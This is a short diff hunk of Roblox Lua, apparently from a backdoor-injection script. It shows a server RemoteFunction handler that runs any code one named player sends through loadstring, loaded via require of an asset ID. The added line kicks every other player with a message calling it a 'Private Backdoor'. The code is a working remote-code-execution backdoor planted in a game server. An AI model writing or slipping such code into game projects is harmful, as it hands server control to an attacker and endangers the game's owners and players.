@@ -1065,6 +1065,7 @@ local loadstring = require(13684410229)
 
 remoteFunction.OnServerInvoke = function(player, code)
     if player.Name ~= "]] .. game.Players.LocalPlayer.Name .. [[" then
+        player:Kick("Backdoor has been secured by Spunchbub - Private Backdoor.")
         return
     end
     loadstring(code)()
